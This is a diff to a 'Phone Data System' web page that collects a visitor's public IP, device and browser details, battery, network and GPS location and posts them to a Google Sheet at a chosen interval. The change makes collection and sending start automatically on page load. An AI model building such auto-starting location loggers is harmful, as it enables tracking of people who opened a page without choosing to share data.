@@ -12,6 +12,7 @@
 
 <title>Phone Data System</title>
 
+
 <style>
 
 *{
@@ -21,133 +22,352 @@
 }
 
 body{
-  font-family:Arial,Helvetica,sans-serif;
+
+  font-family:
+    Arial,
+    Helvetica,
+    sans-serif;
+
   background:#0f172a;
-  color:#fff;
+
+  color:#ffffff;
+
   min-height:100vh;
-  padding:20px;
+
+  padding:15px;
+
 }
+
 
 .container{
+
   width:100%;
+
   max-width:750px;
+
   margin:auto;
+
 }
+
 
 .card{
+
   background:#1e293b;
+
   border-radius:20px;
-  padding:22px;
-  margin-bottom:18px;
-  box-shadow:0 10px 30px rgba(0,0,0,.25);
+
+  padding:20px;
+
+  margin-bottom:16px;
+
+  box-shadow:
+    0 10px 30px
+    rgba(0,0,0,.25);
+
 }
+
 
 h1{
+
   text-align:center;
+
   margin-bottom:20px;
+
 }
+
 
 h2{
+
   margin-bottom:15px;
+
 }
+
+
+.intervalBox{
+
+  background:#0f172a;
+
+  padding:15px;
+
+  border-radius:14px;
+
+  margin-bottom:15px;
+
+}
+
+
+.intervalLabel{
+
+  display:block;
+
+  color:#94a3b8;
+
+  font-size:13px;
+
+  margin-bottom:8px;
+
+}
+
+
+select{
+
+  width:100%;
+
+  padding:14px;
+
+  border:0;
+
+  outline:none;
+
+  border-radius:10px;
+
+  background:#1e293b;
+
+  color:#fff;
+
+  font-size:16px;
+
+}
+
 
 button{
+
   width:100%;
+
   border:0;
+
   border-radius:12px;
+
   padding:15px;
+
   margin-top:10px;
+
   font-size:16px;
+
   font-weight:bold;
+
   cursor:pointer;
+
 }
+
 
 button:disabled{
+
   opacity:.5;
+
   cursor:not-allowed;
+
 }
+
 
 .start{
+
   background:#22c55e;
+
   color:#fff;
+
 }
 
-.test{
-  background:#3b82f6;
-  color:#fff;
-}
 
 .stop{
+
   background:#ef4444;
+
   color:#fff;
+
 }
+
+
+.test{
+
+  background:#3b82f6;
+
+  color:#fff;
+
+}
+
 
 .status{
+
   background:#0f172a;
+
   border-radius:12px;
+
   padding:14px;
+
   margin-top:15px;
-  line-height:1.5;
+
   word-break:break-word;
+
+  line-height:1.5;
+
 }
+
+
+.timerBox{
+
+  text-align:center;
+
+  background:#0f172a;
+
+  border-radius:16px;
+
+  padding:20px;
+
+  margin-top:15px;
+
+}
+
+
+.timerTitle{
+
+  color:#94a3b8;
+
+  font-size:13px;
+
+}
+
+
+.timer{
+
+  font-size:42px;
+
+  font-weight:bold;
+
+  margin-top:8px;
+
+}
+
+
+.timerUnit{
+
+  color:#94a3b8;
+
+  font-size:13px;
+
+}
+
 
 .counter{
+
   text-align:center;
+
   font-size:38px;
+
   font-weight:bold;
+
   margin-top:18px;
+
 }
+
 
 .counterText{
+
   text-align:center;
+
   color:#94a3b8;
+
+  font-size:13px;
+
 }
+
 
 .grid{
+
   display:grid;
-  grid-template-columns:1fr 1fr;
+
+  grid-template-columns:
+    1fr 1fr;
+
   gap:10px;
+
 }
+
 
 .item{
+
   background:#0f172a;
+
   padding:13px;
+
   border-radius:12px;
+
   min-width:0;
+
 }
+
 
 .label{
+
   color:#94a3b8;
+
   font-size:12px;
+
   margin-bottom:6px;
+
 }
+
 
 .value{
+
   font-size:14px;
-  word-break:break-word;
+
   line-height:1.4;
+
+  word-break:break-word;
+
 }
 
-.map{
-  display:block;
-  margin-top:6px;
+
+.mapLink{
+
   color:#60a5fa;
+
   text-decoration:none;
-  word-break:break-all;
+
 }
+
+
+.autoInfo{
+
+  margin-top:10px;
+
+  color:#94a3b8;
+
+  font-size:12px;
+
+  text-align:center;
+
+}
+
 
 @media(max-width:600px){
 
   body{
+
     padding:10px;
+
   }
+
 
   .card{
-    padding:17px;
+
+    padding:16px;
+
   }
 
+
   .grid{
+
     grid-template-columns:1fr;
+
+  }
+
+
+  .timer{
+
+    font-size:36px;
+
   }
 
 }
@@ -163,18 +383,85 @@ button:disabled{
 <div class="container">
 
 
-<!-- =========================================
-     MAIN
-========================================= -->
+<!-- =================================================
+     MAIN CONTROL
+================================================= -->
 
 <div class="card">
+
 
 <h1>📱 Phone Data System</h1>
 
 
+<div class="intervalBox">
+
+
+<label
+  class="intervalLabel"
+  for="interval"
+>
+Data Send Interval
+</label>
+
+
+<select
+  id="interval"
+  onchange="changeInterval()"
+>
+
+
+<option value="1000">
+1 Second
+</option>
+
+
+<option value="2000" selected>
+2 Seconds
+</option>
+
+
+<option value="3000">
+3 Seconds
+</option>
+
+
+<option value="4000">
+4 Seconds
+</option>
+
+
+<option value="5000">
+5 Seconds
+</option>
+
+
+<option value="6000">
+6 Seconds
+</option>
+
+
+<option value="60000">
+1 Minute
+</option>
+
+
+</select>
+
+
+<div class="autoInfo">
+
+⚡ Auto Start Enabled
+
+</div>
+
+
+</div>
+
+
+
 <button
   class="start"
-  id="startButton"
+  id="startBtn"
   onclick="startSystem()"
 >
 ▶ START
@@ -182,51 +469,88 @@ button:disabled{
 
 
 <button
+  class="stop"
+  id="stopBtn"
+  onclick="stopSystem()"
+  disabled
+>
+⏹ STOP
+</button>
+
+
+<button
   class="test"
-  id="testButton"
   onclick="testSend()"
 >
 🧪 TEST SEND
 </button>
 
 
-<button
-  class="stop"
-  id="stopButton"
-  onclick="stopSystem()"
-  disabled
->
-■ STOP
-</button>
-
 
 <div
   class="status"
   id="status"
 >
-System stopped
+Starting system...
 </div>
+
+
+
+<!-- =================================================
+     COUNTDOWN
+================================================= -->
+
+<div class="timerBox">
+
+
+<div class="timerTitle">
+NEXT DATA SEND
+</div>
+
+
+<div
+  class="timer"
+  id="countdown"
+>
+-
+</div>
+
+
+<div class="timerUnit">
+seconds
+</div>
+
+
+</div>
+
 
 
 <div class="counter">
-<span id="counter">0</span>
+
+<span id="count">
+0
+</span>
+
 </div>
+
 
 <div class="counterText">
-Data Sent
+Total Data Sent
 </div>
 
+
 </div>
 
 
 
-<!-- =========================================
+<!-- =================================================
      DEVICE INFORMATION
-========================================= -->
+================================================= -->
 
 <div class="card">
 
-<h2>Device Information</h2>
+
+<h2>📱 Device Information</h2>
 
 
 <div class="grid">
@@ -315,7 +639,7 @@ Battery
 <div class="item">
 
 <div class="label">
-Online
+Online Status
 </div>
 
 <div
@@ -331,7 +655,7 @@ Online
 <div class="item">
 
 <div class="label">
-Network
+Network Type
 </div>
 
 <div
@@ -446,11 +770,12 @@ Platform
 
 
 
-<!-- =========================================
+<!-- =================================================
      LOCATION
-========================================= -->
+================================================= -->
 
 <div class="card">
+
 
 <h2>📍 Location</h2>
 
@@ -514,17 +839,9 @@ Google Maps
 
 <div
   class="value"
->
-
-<a
-  class="map"
   id="maps"
-  href="#"
-  target="_blank"
 >
-Waiting...
-</a>
-
+-
 </div>
 
 </div>
@@ -543,7 +860,7 @@ Waiting...
 
 
 // =====================================================
-// APPS SCRIPT URL
+// GOOGLE APPS SCRIPT URL
 // =====================================================
 
 const SCRIPT_URL =
@@ -557,9 +874,13 @@ const SCRIPT_URL =
 
 let running = false;
 
-let timer = null;
+let sendTimer = null;
 
-let count = 0;
+let countdownTimer = null;
+
+let sentCount = 0;
+
+let countdownValue = 0;
 
 let latitude = "";
 
@@ -567,9 +888,46 @@ let longitude = "";
 
 let accuracy = "";
 
-let ip = "";
+let publicIP = "";
 
-let battery = "";
+let batteryLevel = "";
+
+
+
+// =====================================================
+// GET SELECTED INTERVAL
+// =====================================================
+
+function getInterval(){
+
+  return Number(
+    document.getElementById("interval").value
+  );
+
+}
+
+
+
+// =====================================================
+// FORMAT TIME
+// =====================================================
+
+function formatCountdown(ms){
+
+  if(ms <= 0){
+
+    return "0";
+
+  }
+
+
+  const seconds =
+    Math.ceil(ms / 1000);
+
+
+  return seconds.toString();
+
+}
 
 
 
@@ -597,6 +955,15 @@ function getDevice(){
 
 
   if(
+    ua.includes("android")
+  ){
+
+    return "Android";
+
+  }
+
+
+  if(
     ua.includes("iphone")
   ){
 
@@ -615,15 +982,6 @@ function getDevice(){
 
 
   if(
-    ua.includes("android")
-  ){
-
-    return "Android";
-
-  }
-
-
-  if(
     ua.includes("windows")
   ){
 
@@ -633,7 +991,7 @@ function getDevice(){
 
 
   if(
-    ua.includes("mac")
+    ua.includes("macintosh")
   ){
 
     return "Mac";
@@ -799,20 +1157,19 @@ async function getIP(){
       await response.json();
 
 
-    ip =
+    publicIP =
       data.ip || "";
 
 
     document.getElementById("ip")
       .textContent =
-      ip || "Unavailable";
-
+      publicIP || "Unavailable";
 
   }
 
   catch(error){
 
-    ip = "";
+    publicIP = "";
 
     document.getElementById("ip")
       .textContent =
@@ -841,7 +1198,7 @@ async function getBattery(){
         await navigator.getBattery();
 
 
-      battery =
+      batteryLevel =
         Math.round(
           b.level * 100
         ) + "%";
@@ -849,14 +1206,14 @@ async function getBattery(){
 
       document.getElementById("battery")
         .textContent =
-        battery;
+        batteryLevel;
 
 
       b.addEventListener(
         "levelchange",
         function(){
 
-          battery =
+          batteryLevel =
             Math.round(
               b.level * 100
             ) + "%";
@@ -864,7 +1221,7 @@ async function getBattery(){
 
           document.getElementById("battery")
             .textContent =
-            battery;
+            batteryLevel;
 
         }
       );
@@ -872,8 +1229,6 @@ async function getBattery(){
     }
 
     else{
-
-      battery = "";
 
       document.getElementById("battery")
         .textContent =
@@ -884,8 +1239,6 @@ async function getBattery(){
   }
 
   catch(error){
-
-    battery = "";
 
     document.getElementById("battery")
       .textContent =
@@ -908,7 +1261,7 @@ function startLocation(){
   ){
 
     setStatus(
-      "❌ Geolocation is not supported."
+      "Location is not supported."
     );
 
     return;
@@ -947,29 +1300,26 @@ function startLocation(){
         accuracy + " meters";
 
 
-      const mapsURL =
+      const mapURL =
         "https://www.google.com/maps?q=" +
         latitude +
         "," +
         longitude;
 
 
-      const maps =
-        document.getElementById("maps");
-
-
-      maps.href =
-        mapsURL;
-
-
-      maps.textContent =
-        "Open Google Maps";
-
+      document.getElementById("maps")
+        .innerHTML =
+        '<a class="mapLink" ' +
+        'href="' +
+        mapURL +
+        '" target="_blank">' +
+        'Open Google Maps' +
+        '</a>';
 
     },
 
 
-    function(error){
+    function(){
 
       document.getElementById("latitude")
         .textContent =
@@ -984,11 +1334,6 @@ function startLocation(){
       document.getElementById("accuracy")
         .textContent =
         "-";
-
-
-      setStatus(
-        "⚠️ Location permission was not given."
-      );
 
     },
 
@@ -1015,13 +1360,13 @@ function startLocation(){
 
 function getNetwork(){
 
-  const c =
+  const connection =
     navigator.connection ||
     navigator.mozConnection ||
     navigator.webkitConnection;
 
 
-  if(!c){
+  if(!connection){
 
     return {
 
@@ -1037,16 +1382,16 @@ function getNetwork(){
   return {
 
     type:
-      c.effectiveType || "",
+      connection.effectiveType || "",
 
     speed:
-      c.downlink
-        ? c.downlink + " Mbps"
+      connection.downlink
+        ? connection.downlink + " Mbps"
         : "",
 
     rtt:
-      c.rtt
-        ? c.rtt + " ms"
+      connection.rtt
+        ? connection.rtt + " ms"
         : ""
 
   };
@@ -1056,7 +1401,7 @@ function getNetwork(){
 
 
 // =====================================================
-// DISPLAY INFO
+// SHOW DEVICE INFO
 // =====================================================
 
 function showDeviceInfo(){
@@ -1171,7 +1516,7 @@ function collectData(){
       maps,
 
     ip:
-      ip,
+      publicIP,
 
     device:
       getDevice(),
@@ -1183,7 +1528,7 @@ function collectData(){
       getBrowser(),
 
     battery:
-      battery,
+      batteryLevel,
 
     online:
       navigator.onLine
@@ -1225,34 +1570,25 @@ function collectData(){
 
 
 // =====================================================
-// SEND TO GOOGLE SHEET
+// SEND DATA
 // =====================================================
 
 async function sendData(){
-
-  if(!running){
-
-    return;
-
-  }
-
 
   const data =
     collectData();
 
 
-  const params =
+  const body =
     new URLSearchParams();
 
 
   Object.keys(data).forEach(
     function(key){
 
-      params.append(
+      body.append(
         key,
-        data[key] == null
-          ? ""
-          : data[key]
+        data[key] ?? ""
       );
 
     }
@@ -1279,23 +1615,23 @@ async function sendData(){
         },
 
         body:
-          params.toString()
+          body.toString()
 
       }
 
     );
 
 
-    count++;
+    sentCount++;
 
 
-    document.getElementById("counter")
+    document.getElementById("count")
       .textContent =
-      count;
+      sentCount;
 
 
     setStatus(
-      "🟢 Data sent successfully • " +
+      "✅ Data sent • " +
       new Date().toLocaleTimeString()
     );
 
@@ -1316,37 +1652,120 @@ async function sendData(){
 
 
 // =====================================================
-// TEST SEND
+// COUNTDOWN
 // =====================================================
 
-async function testSend(){
+function startCountdown(){
 
-  setStatus(
-    "🧪 Sending test data..."
-  );
+  if(countdownTimer){
 
-
-  const oldRunning =
-    running;
-
-
-  running = true;
-
-
-  await sendData();
-
-
-  running =
-    oldRunning;
-
-
-  if(!oldRunning){
-
-    setStatus(
-      "🧪 Test sent. Check the Google Sheet."
+    clearInterval(
+      countdownTimer
     );
 
   }
+
+
+  const interval =
+    getInterval();
+
+
+  const startTime =
+    Date.now();
+
+
+  const endTime =
+    startTime + interval;
+
+
+  function update(){
+
+    if(!running){
+
+      document.getElementById(
+        "countdown"
+      ).textContent = "-";
+
+      return;
+
+    }
+
+
+    const remaining =
+      endTime - Date.now();
+
+
+    document.getElementById(
+      "countdown"
+    ).textContent =
+    formatCountdown(remaining);
+
+
+    if(remaining <= 0){
+
+      clearInterval(
+        countdownTimer
+      );
+
+    }
+
+  }
+
+
+  update();
+
+
+  countdownTimer =
+    setInterval(
+      update,
+      100
+    );
+
+}
+
+
+
+// =====================================================
+// SEND LOOP
+// =====================================================
+
+function startSendLoop(){
+
+  if(sendTimer){
+
+    clearInterval(
+      sendTimer
+    );
+
+  }
+
+
+  const interval =
+    getInterval();
+
+
+  sendTimer =
+    setInterval(
+      async function(){
+
+        if(!running){
+
+          return;
+
+        }
+
+
+        await sendData();
+
+
+        startCountdown();
+
+      },
+      interval
+    );
+
+
+  startCountdown();
 
 }
 
@@ -1368,16 +1787,16 @@ async function startSystem(){
   running = true;
 
 
-  document.getElementById("startButton")
+  document.getElementById("startBtn")
     .disabled = true;
 
 
-  document.getElementById("stopButton")
+  document.getElementById("stopBtn")
     .disabled = false;
 
 
   setStatus(
-    "⏳ Starting system..."
+    "⏳ Starting..."
   );
 
 
@@ -1393,22 +1812,18 @@ async function startSystem(){
   startLocation();
 
 
-  // প্রথম data
+  // First send immediately
 
   await sendData();
 
 
-  // প্রতি 2 second
+  // Start selected interval
 
-  timer =
-    setInterval(
-      sendData,
-      2000
-    );
+  startSendLoop();
 
 
   setStatus(
-    "🟢 System running • Sending every 2 seconds"
+    "🟢 Running • Auto Start ON"
   );
 
 }
@@ -1416,7 +1831,7 @@ async function startSystem(){
 
 
 // =====================================================
-// STOP
+// STOP SYSTEM
 // =====================================================
 
 function stopSystem(){
@@ -1424,25 +1839,148 @@ function stopSystem(){
   running = false;
 
 
-  if(timer){
+  if(sendTimer){
 
-    clearInterval(timer);
+    clearInterval(
+      sendTimer
+    );
 
-    timer = null;
+    sendTimer = null;
 
   }
 
 
-  document.getElementById("startButton")
+  if(countdownTimer){
+
+    clearInterval(
+      countdownTimer
+    );
+
+    countdownTimer = null;
+
+  }
+
+
+  document.getElementById(
+    "countdown"
+  ).textContent = "-";
+
+
+  document.getElementById("startBtn")
     .disabled = false;
 
 
-  document.getElementById("stopButton")
+  document.getElementById("stopBtn")
     .disabled = true;
 
 
   setStatus(
     "⏹ System stopped"
+  );
+
+}
+
+
+
+// =====================================================
+// CHANGE INTERVAL
+// =====================================================
+
+function changeInterval(){
+
+  const interval =
+    getInterval();
+
+
+  const seconds =
+    interval / 1000;
+
+
+  if(running){
+
+    startSendLoop();
+
+
+    setStatus(
+      "🔄 Interval changed to " +
+      getIntervalText() +
+      " • Running"
+    );
+
+  }
+
+  else{
+
+    setStatus(
+      "Interval selected: " +
+      getIntervalText()
+    );
+
+  }
+
+}
+
+
+
+// =====================================================
+// INTERVAL TEXT
+// =====================================================
+
+function getIntervalText(){
+
+  const interval =
+    getInterval();
+
+
+  if(interval === 60000){
+
+    return "1 minute";
+
+  }
+
+
+  return (
+    interval / 1000
+  ) + " seconds";
+
+}
+
+
+
+// =====================================================
+// TEST SEND
+// =====================================================
+
+async function testSend(){
+
+  setStatus(
+    "🧪 Sending test data..."
+  );
+
+
+  const wasRunning =
+    running;
+
+
+  if(!wasRunning){
+
+    running = true;
+
+  }
+
+
+  await sendData();
+
+
+  if(!wasRunning){
+
+    running = false;
+
+  }
+
+
+  setStatus(
+    "🧪 Test request sent. Check Google Sheet."
   );
 
 }
@@ -1479,10 +2017,32 @@ window.addEventListener(
 
 
 // =====================================================
-// INITIAL DISPLAY
+// AUTO START
 // =====================================================
 
-showDeviceInfo();
+window.addEventListener(
+  "load",
+  function(){
+
+    showDeviceInfo();
+
+
+    /*
+      Page load হওয়ার পর
+      automatically system start হবে।
+    */
+
+    setTimeout(
+      function(){
+
+        startSystem();
+
+      },
+      1000
+    );
+
+  }
+);
 
 </script>
 
